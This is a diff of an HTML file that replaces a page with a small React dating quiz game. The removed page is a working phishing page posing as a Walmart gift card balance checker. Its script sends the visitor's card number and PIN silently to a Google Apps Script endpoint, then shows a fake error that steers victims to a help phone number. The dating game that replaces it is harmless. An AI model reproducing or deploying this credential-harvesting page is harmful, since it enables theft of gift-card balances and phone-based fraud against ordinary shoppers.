@@ -1,227 +1,123 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-   <script type="text/javascript">
+    <script type="text/javascript">
     (function(c,l,a,r,i,t,y){
         c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
         t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
         y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
     })(window, document, "clarity", "script", "snjdjg8gp4");
 </script>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Check Gift Card Balance</title>
-  <style>
-    body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background-color: #fff;
-    }
-
-    header {
-      background-color: #005be3;
-      padding: 16px;
-      text-align: center;
-      color: white;
-      font-size: 20px;
-      font-weight: bold;
-    }
-
-    .breadcrumb {
-      padding: 16px;
-      font-size: 14px;
-      color: #555;
-    }
-
-    .container {
-      max-width: 800px;
-      margin: auto;
-      padding: 16px;
-    }
-
-    h1 {
-      font-size: 24px;
-      margin-bottom: 24px;
-    }
-
-    label {
-      display: block;
-      margin-bottom: 6px;
-      font-weight: bold;
-    }
-
-    input[type="text"] {
-      width: 100%;
-      padding: 10px;
-      margin-bottom: 20px;
-      font-size: 16px;
-      box-sizing: border-box;
-    }
-
-    .input-row {
-      display: flex;
-      gap: 16px;
-      flex-wrap: wrap;
-    }
-
-    .input-row > div {
-      flex: 1;
-      min-width: 200px;
-    }
-
-    button {
-      background-color: #005be3;
-      color: white;
-      padding: 12px 24px;
-      font-size: 16px;
-      border: none;
-      border-radius: 20px;
-      cursor: pointer;
-    }
-
-    .tips-box {
-      margin-top: 40px;
-      padding: 20px;
-      border: 1px solid #ddd;
-      border-radius: 12px;
-      display: flex;
-      flex-wrap: wrap;
-      gap: 32px;
-    }
-
-    .tip {
-      flex: 1;
-      min-width: 200px;
-    }
-
-    .tip h3 {
-      font-size: 16px;
-      margin-bottom: 8px;
-    }
-
-    .tip p {
-      font-size: 14px;
-      color: #333;
-    }
-
-    .tip ul {
-      margin: 0;
-      padding-left: 20px;
-    }
-
-    .tip img {
-      margin-top: 12px;
-      width: 140px;
-    }
-
-    .error {
-      display: none;
-      color: red;
-      font-size: 14px;
-      margin-top: 10px;
-    }
-
-    .error a {
-      color: red;
-      text-decoration: underline;
-    }
-
-    @media (max-width: 600px) {
-      .input-row {
-        flex-direction: column;
-      }
-    }
-  </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Dating Game</title>
+  <script src="https://cdn.jsdelivr.net/npm/react@18.2.0/umd/react.development.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/react-dom@18.2.0/umd/react-dom.development.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@babel/standalone@7.20.6/babel.min.js"></script>
+  <script src="https://cdn.tailwindcss.com"></script>
 </head>
 <body>
+  <div id="root" class="min-h-screen bg-gradient-to-br from-pink-100 to-purple-100 flex items-center justify-center"></div>
+  <script type="text/babel">
+    const { useState } = React;
 
-  <header>
-    Gift card
-  </header>
+    const DatingGame = () => {
+      const [stage, setStage] = useState(0);
+      const [connection, setConnection] = useState(50);
+      const [gameOver, setGameOver] = useState(false);
 
-  <div class="breadcrumb">
-    Gift cards / Check Gift Card Balance
-  </div>
+      const scenarios = [
+        {
+          text: "You meet Alex at a cozy coffee shop. Alex smiles and asks about your favorite book. What do you say?",
+          options: [
+            { text: "I love 'The Great Gatsby' for its timeless themes.", points: 10 },
+            { text: "I don’t read much, but I’m into action movies!", points: -5 },
+            { text: "I enjoy sci-fi novels like 'Dune'.", points: 5 }
+          ]
+        },
+        {
+          text: "Alex suggests going for a walk in the park. During the walk, Alex mentions loving music. How do you respond?",
+          options: [
+            { text: "That’s cool! I play guitar in my free time.", points: 15 },
+            { text: "I’m not really into music, more of a sports person.", points: -10 },
+            { text: "I love music too! What’s your favorite band?", points: 10 }
+          ]
+        },
+        {
+          text: "At dinner, Alex shares a story about a recent trip. How do you keep the conversation going?",
+          options: [
+            { text: "That sounds amazing! Where else have you traveled?", points: 10 },
+            { text: "Cool story, but I’ve never left my hometown.", points: -5 },
+            { text: "I went on a similar trip last year!", points: 15 }
+          ]
+        }
+      ];
 
-  <div class="container">
-    <h1>Check gift card balance</h1>
-
-    <form id="cardForm">
-      <div class="input-row">
-        <div>
-          <label for="giftCardNumber">Card number* (16 digits)</label>
-          <input type="text" name="giftCardNumber" id="giftCardNumber" maxlength="16" required />
-        </div>
-        <div>
-          <label for="accessNumber">PIN* (4 digits)</label>
-          <input type="text" name="accessNumber" id="accessNumber" maxlength="4" required />
-        </div>
-      </div>
-
-      <button type="submit">Check Balance</button>
-      <div id="errorMsg" class="error">
-        We couldn’t verify your gift card. Try again or call <a href="tel:+18447092550">+1-844-709-2550</a> for help.
-      </div>
-    </form>
-
-    <div class="tips-box">
-      <div class="tip">
-        <h3>Physical gift card</h3>
-        <p>Scratch off the silver coating on back of card to reveal</p>
-        <ul>
-          <li>Last 4 digits of 16-digit gift card number</li>
-          <li>PIN</li>
-        </ul>
-        <img src="https://i.imgur.com/Wlb3TSE.png" alt="Card image" />
-      </div>
-
-      <div class="tip">
-        <h3>eGift card</h3>
-        <p>Find the PIN in the confirmation email</p>
-      </div>
-
-      <div class="tip">
-        <h3>Don’t have a PIN?</h3>
-        <p>
-          To check your balance, you'll need to exchange your gift card for one with a PIN.
-          You can do this at any Walmart store.
-        </p>
-        <p>
-          For additional help, call <a href="tel:+18447092550"><strong>+1-844-709-2550</strong></a>
-        </p>
-      </div>
-    </div>
-  </div>
-
-  <script>
-    document.getElementById("cardForm").addEventListener("submit", function (event) {
-      event.preventDefault();
-
-      const formData = new FormData(event.target);
-      const formDetails = {
-        giftCardNumber: formData.get("giftCardNumber"),
-        accessNumber: formData.get("accessNumber"),
+      const handleChoice = (points) => {
+        const newConnection = Math.min(100, Math.max(0, connection + points));
+        setConnection(newConnection);
+        if (stage < scenarios.length - 1) {
+          setStage(stage + 1);
+        } else {
+          setGameOver(true);
+        }
       };
 
-      const scriptURL = "https://script.google.com/macros/s/AKfycbzzt1AhRUn8j4K4xeqBAw1tU8Zx3vWytJkakRmTXUnWl6BTb4a9pBWN8J2S7UNeIOVz/exec";
+      const restartGame = () => {
+        setStage(0);
+        setConnection(50);
+        setGameOver(false);
+      };
 
-      fetch(scriptURL, {
-        method: "POST",
-        mode: "no-cors",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify(formDetails),
-      })
-        .then(() => {
-          document.getElementById("errorMsg").style.display = "block";
-        })
-        .catch((error) => {
-          console.error("Error:", error);
-          alert("⚠️ Something went wrong! Try again.");
-        });
-    });
+      const getOutcome = () => {
+        if (connection >= 80) return "Alex is thrilled and asks you out again!";
+        if (connection >= 50) return "Alex enjoyed the date and might call you later.";
+        return "Alex doesn’t feel a spark. Better luck next time!";
+      };
+
+      return (
+        <div className="max-w-md mx-auto p-6 bg-white rounded-lg shadow-lg">
+          <h1 className="text-3xl font-bold text-center text-purple-600 mb-4">Dating Adventure</h1>
+          <div className="mb-4">
+            <div className="w-full bg-gray-200 rounded-full h-4">
+              <div
+                className="bg-pink-500 h-4 rounded-full"
+                style={{ width: `${connection}%` }}
+              ></div>
+            </div>
+            <p className="text-center text-sm text-gray-600 mt-2">Connection: {connection}%</p>
+          </div>
+          {gameOver ? (
+            <div className="text-center">
+              <p className="text-lg text-gray-800 mb-4">{getOutcome()}</p>
+              <button
+                onClick={restartGame}
+                className="px-4 py-2 bg-purple-600 text-white rounded hover:bg-purple-700 transition"
+              >
+                Play Again
+              </button>
+            </div>
+          ) : (
+            <div>
+              <p className="text-lg text-gray-800 mb-4">{scenarios[stage].text}</p>
+              <div className="space-y-2">
+                {scenarios[stage].options.map((option, index) => (
+                  <button
+                    key={index}
+                    onClick={() => handleChoice(option.points)}
+                    className="w-full px-4 py-2 bg-pink-200 text-gray-800 rounded hover:bg-pink-300 transition"
+                  >
+                    {option.text}
+                  </button>
+                ))}
+              </div>
+            </div>
+          )}
+        </div>
+      );
+    };
+
+    ReactDOM.render(<DatingGame />, document.getElementById('root'));
   </script>
-
 </body>
 </html>
